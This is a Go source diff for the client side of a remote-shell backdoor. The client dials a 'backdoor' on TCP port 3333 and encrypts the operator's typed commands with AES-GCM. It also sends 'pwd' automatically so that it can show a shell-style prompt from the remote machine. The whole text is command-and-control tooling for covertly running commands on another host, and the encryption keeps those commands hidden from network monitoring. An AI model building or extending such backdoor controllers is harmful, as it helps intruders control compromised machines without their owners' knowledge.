@@ -16,6 +16,8 @@ import (
 	"golang.org/x/crypto/hkdf"
 )
 
+var pwd bool = false
+
 func seal(msg []byte, info []byte, gcm cipher.AEAD) []byte {
 	nonce := make([]byte, gcm.NonceSize())
 	rand.Read(nonce)
@@ -33,16 +35,39 @@ func sendThread(conn net.Conn, gcm cipher.AEAD, info []byte) {
 	reader := bufio.NewReader(os.Stdin)
 	for {
 		in, _ := reader.ReadString('\n')
-		conn.Write([]byte(in))
+		ct := seal([]byte(in), info, gcm)
+		conn.Write(ct)
 	}
 }
 
 func recvThread(conn net.Conn, gcm cipher.AEAD, info []byte, wg *sync.WaitGroup) {
 	buf := make([]byte, 1052)
+	pwd = true
 	for {
+		if pwd {
+			ct := seal([]byte("pwd\n"), info, gcm)
+			conn.Write(ct)
+			r, err := conn.Read(buf)
+			if err != nil {
+				break
+			}
+			tempBuf := buf[:r]
+			pt, err := open(tempBuf, info, gcm)
+			if err != nil {
+				fmt.Println("err in pwd")
+				break
+			}
+			fmt.Print(string(pt[:len(pt)-1]) + "> ")
+		}
+
 		r, err := conn.Read(buf)
 		if err != nil {
 			break
+		}
+		if r == 1052 {
+			pwd = false
+		} else {
+			pwd = true
 		}
 		tempBuf := buf[:r]
 		pt, err := open(tempBuf, info, gcm)
@@ -57,7 +82,11 @@ func recvThread(conn net.Conn, gcm cipher.AEAD, info []byte, wg *sync.WaitGroup)
 
 func main() {
 	// Begin connection
-	conn, _ := net.Dial("tcp", "localhost:3333")
+	conn, err := net.Dial("tcp", "localhost:3333")
+	if err != nil {
+		fmt.Println("Error dialing the backdoor, exiting...")
+		return
+	}
 	defer conn.Close()
 
 	// Generate private and public keys
